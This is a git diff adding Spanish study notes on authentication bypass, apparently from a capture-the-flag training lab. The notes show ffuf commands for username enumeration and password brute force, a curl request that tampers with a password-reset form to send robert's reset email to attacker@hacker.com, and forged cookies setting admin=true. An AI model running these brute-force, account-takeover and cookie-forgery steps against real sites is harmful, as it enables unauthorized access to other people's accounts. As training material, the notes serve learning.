@@ -238,4 +238,109 @@ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.
 
 # BYPASS DE AUTENTICACIÓN
 
+Aprenderemos diferentes forcas de autenticación y metodos de pasarlos y romperlos. Este tipo de vulnerabilidades son las más críticas.
+
+## ENUMERACIÓN DE USUARIO
+
+Un ejecicio muy bueno para completar es cuanto intentamos buscar vulnerabilidades de autenticación creando usuarios validos.
+
+Los errores de la web son un gran recurso de informacion para construir usuarios validos.
+
+Si intentamos usar el username "admin" y poner otros con información fake, veremos errores como "an account with this username alredy exit" sabiendo eso podemos ir haciendo listas validas
+
+```
+ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.225.254/customers/signup -mr "username already exists"
+```
+
+- -w : lista de usuarios
+- -X : meotod de consulta "POST"
+- -d : meotodo para enviar.
+- FUZZ
+- -H : añadir headers adicionales
+- Content-Type : mandamos datos
+- -u : url
+- -mr : argumento para validar si encontramos usuarios validos.
+
+## POR FUERZA BRUTA
+
+Ahora usaremos el ataque por fuerza bruta. (Es lo mismo pero con un txt mas duro)
+
+```
+ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.225.254/customers/login -fc 200
+```
+
+![image](https://github.com/user-attachments/assets/21c613f2-027b-4129-84b4-c2d15ca92372)
+
+## LÓGICA POR DEFECTO
+
+Aveces los procesos de autenticación tienen una lógica. Es cuando la tipica ruta logica en la aplicación se puede hacer un bypass, o manipularla. Esto existe en todas las webs
+
+![image](https://github.com/user-attachments/assets/5d2a27f1-5888-4cae-971f-e088ef272d43)
+
+### EJEMPLO
+
+El código de bajo chekea que el usuario empieza desde una ruta exacta /admin 
+
+```
+if( url.substr(0,6) === '/admin') {
+    # Code to check user is an admin
+} else {
+    # View Page
+}
+```
+
+Porque el codigo PHP usa === esto hace para que sea el match exacto, incluyendo la misma letra. El codigo presenta una logica porque la unatenticación de usuario /adMin no te dara privilegios y la pagina se displayeara.
+
+```
+curl 'http://10.10.225.254/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
+```
+En la aplicacion la cuenta del usuario le devuelve una consulta, pero luego el código tiene un $_Request
+
+esta variable contiene los datos recibidos del POST. En la misma consulta el nombre del POST  simplemente cambiamos los POST para cambiar el email.
+
+```
+curl 'http://10.10.225.254/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
+```
+![image](https://github.com/user-attachments/assets/f5ccf629-8821-4219-9b31-6c2efa6ec434)
+
+## MANIPULACIÓN DE COOKIES
+
+Examinando y editando las cookies podemos hacer que un servidor wb de una sesion online tenga diferentes resultados, pudiendo hacer un acceso no autenticado, o desde otro usuario o elevar privilegios.
+
+La mayoria de las cookies van en texto plano.
+
+![image](https://github.com/user-attachments/assets/d3d80c80-370c-49d5-8df4-99a587de8311)
+
+Nosotros usamos una cookie (logged_in) que da el control del usuario que esta loggeado en este momento o no o un admin que tenga dichos permisos. Usando la logica, podemos cambiar el contenido de las cookies para nuestros privilegios
+
+```
+curl http://10.10.225.254/cookie-test
+```
+
+Ahora mandaremos otra consulta de la (logged_IN) para ponerlo en true y la admin cookie en falso
+
+```
+curl -H "Cookie: logged_in=true; admin=false" http://10.10.225.254/cookie-test
+```
+Recibimos el mensaje "Logged In As A User"
+
+```
+curl -H "Cookie: logged_in=true; admin=true" http://10.10.225.254/cookie-test
+```
+
+Nos devuelve el mensaje "Logged In As An Admin" 
+
+Aveces la cookie esta en hash 
+
+
+![image](https://github.com/user-attachments/assets/ed4db9e6-86d7-4b45-b379-54467c653c6d)
+
+[CrackStation](https://crackstation.net)
+
+El codificar es similar que el hash esto se hace para hacer bypass, comunes con base32, base64, etc
+
+Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/
+
+Esta string esta en base64 codificada con el valor ("id":1,"admin":false)
+
 
